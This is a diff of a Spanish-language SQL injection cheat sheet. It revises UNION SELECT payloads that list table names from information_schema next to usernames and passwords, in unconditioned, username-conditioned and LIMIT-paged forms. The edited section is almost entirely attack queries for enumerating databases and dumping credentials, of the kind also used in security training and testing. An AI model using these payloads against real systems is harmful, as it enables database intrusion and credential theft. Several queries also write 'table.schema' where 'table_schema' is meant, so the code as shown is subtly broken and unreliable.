@@ -159,20 +159,20 @@ SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,GROUP
 
 ## Basic Union Select (v1) (Dumpeando todas las tablas de todas las DB)
 SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables;
-## Basic Union Select (v1) (Dumpeando solo las tablas de database())
+## Basic Union Select (v1) (Dumpeando únicamente las tablas de: database())
 SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
 SELECT username,password FROM users UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = "Fz3r0_Corporations";
 
 ## Condition Union Select (v2) (Todas las tablas de Todas las DB)
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables;
+## Condition Union Select (v2) (Dumpeando únicamente las tablas de: database())
 SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
-## Condition Union Select (v2) (Solo tablas de determinada DB)
-SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
-SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database();
+SELECT username,password FROM users where username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = "Fz3r0_Corporations";
 
 ## Condition Union Select (v2) + LIMIT:
-SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 0,1;
-SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 1,1;
-SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables LIMIT 2,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 0,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 1,1;
+SELECT username,password FROM users WHERE username = 'F0n3' UNION SELECT 1,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 2,1;
 
 
 ````
